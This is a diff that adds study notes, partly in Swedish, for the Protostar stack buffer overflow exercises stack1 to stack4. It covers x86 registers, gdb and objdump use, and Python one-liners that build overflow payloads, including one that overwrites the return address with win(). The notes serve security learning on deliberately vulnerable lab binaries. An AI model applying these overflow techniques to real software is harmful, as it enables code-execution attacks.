@@ -1,0 +1,50 @@
+// Hex to decimal
+echo $(python -c "print(int('0x84', 0))")
+
+// Decimal to hex
+echo $(python -c "print(hex(65))")
+
+// Decimal to byte
+echo $(python -c "print(chr(132))")
+
+Registers
+EAX: Accumulator used for performing calculations, and used to store return values from function calls. Basic operations such as add, subtract, compare use this general-purpose register
+EBX: Base (does not have anything to do with base pointer). It has no general-purpose and can be used to store data.
+ECX: Counter used for iterations. ECX counts downward.
+EDX: Data this is an extension of the EAX register. It allows for more complex calculations (multiply, divide) by allowing extra data to be stored to facilitate those calculations.
+ESP: Stack pointer
+EBP: Base pointer
+ESI: Source Index holds the location of input data
+EDI: Destination Index points to the location where the result of data operation is stored
+EIP: Instruction Pointer
+
+GDB: https://sourceware.org/gdb/onlinedocs/gdb/Invoking-GDB.html
+
+// Till standard input 
+echo $(python -c "print('A'*300)") | ./stack4
+
+// Som argument 
+echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1
+
+**** stack1 ****
+echo $(python -c "print('A'*64 + 'dcba')") | xargs ./stack1
+
+**** stack2 ****
+export GREENIE=$(python -c "print('A'*64 + '\n\r\n\r')")
+
+**** stack3 ****
+gdb ./stack3            (objdump -d ./stack3)
+disassemble main
+disassemble win
+win() startaddr: 0x08048424 
+echo $(python -c "print('A'*64 + '$' + chr(132) + chr(4) + chr(8))") | ./stack3
+
+**** stack4 ****
+objdump -d ./stack4     -> Adress för win = 080483f4
+tmux    -> terminal multiplexer
+gdb ./stack4
+break main
+info registers -> check eip
+
+./stack4 &  -> start process
+gdb -p 1704 -> attach to running process
